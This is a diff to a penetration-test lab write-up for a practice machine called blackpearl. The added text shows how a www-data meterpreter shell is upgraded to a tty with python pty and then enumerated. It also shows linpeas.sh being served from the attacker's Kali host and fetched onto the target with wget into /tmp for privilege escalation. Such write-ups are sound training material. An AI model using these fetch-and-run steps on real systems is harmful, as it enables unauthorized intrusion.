@@ -305,7 +305,9 @@ www-data
 
 ```
 
-However we need a tty session, we we can use the link found in https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell to create a shell session. I used the 
+However we need a tty session, we we can use the link found in https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell to create a shell session. I used the `python -c 'import pty; pty.spawn("/bin/bash")'` to create a tty bash session
+
+After that I checked `sudo -l` and `history` to enumerate but we have no privilege
 
 ```
 meterpreter > shell
@@ -332,6 +334,66 @@ history
     3  history
 
 ```
+
+Since we have no privilege, lets download the linpeas. Make your kali as python http server. All files that will be transferred are in /transfer files of the kali/attacker's machine
+
+- In your kali
+```
+┌──(root㉿kali)-[~]
+└─# cd /transfer
+
+┌──(root㉿kali)-[/transfer]
+└─# ls
+Wise.exe  linpeas.sh  pspy64  winPEASx64.exe
+┌──(root㉿kali)-[/transfer]
+└─# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.64.8 - - [10/Jul/2024 10:45:05] "GET /linpeas.sh HTTP/1.1" 200 -
+^X@sc
+
+
+```
+
+- Then in the tty shell, go to `/tmp` directory to download the linpeas.sh
+
+```
+www-data@blackpearl:~/blackpearl.tcm/navigate$ cd /tmp
+cd /tmp
+www-data@blackpearl:/tmp$ wget http://192.168.64.4/linpeas.sh linpeas.sh
+wget http://192.168.64.4/linpeas.sh linpeas.sh
+--2024-07-10 13:45:05--  http://192.168.64.4/linpeas.sh
+Connecting to 192.168.64.4:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 860337 (840K) [text/x-sh]
+Saving to: 'linpeas.sh'
+
+linpeas.sh          100%[===================>] 840.17K  --.-KB/s    in 0.01s   
+
+2024-07-10 13:45:05 (69.6 MB/s) - 'linpeas.sh' saved [860337/860337]
+
+--2024-07-10 13:45:05--  http://linpeas.sh/
+Resolving linpeas.sh (linpeas.sh)... 172.64.80.1, 2606:4700:130:436c:6f75:6466:6c61:7265
+Connecting to linpeas.sh (linpeas.sh)|172.64.80.1|:80... connected.
+HTTP request sent, awaiting response... 301 Moved Permanently
+Location: https://linpeas.sh/ [following]
+--2024-07-10 13:45:05--  https://linpeas.sh/
+Connecting to linpeas.sh (linpeas.sh)|172.64.80.1|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [text/html]
+Saving to: 'index.html'
+
+index.html              [ <=>                ] 834.68K  --.-KB/s    in 0.07s   
+
+2024-07-10 13:45:05 (11.3 MB/s) - 'index.html' saved [854710]
+
+FINISHED --2024-07-10 13:45:05--
+Total wall clock time: 0.5s
+Downloaded: 2 files, 1.6M in 0.08s (19.5 MB/s)
+www-data@blackpearl:/tmp$ chmod u+x linpeas.sh  
+chmod u+x linpeas.sh
+
+```
+
 
 - Checking the source code of the default website, we see the webmaster: `alek@blackpearl.tcm`
 
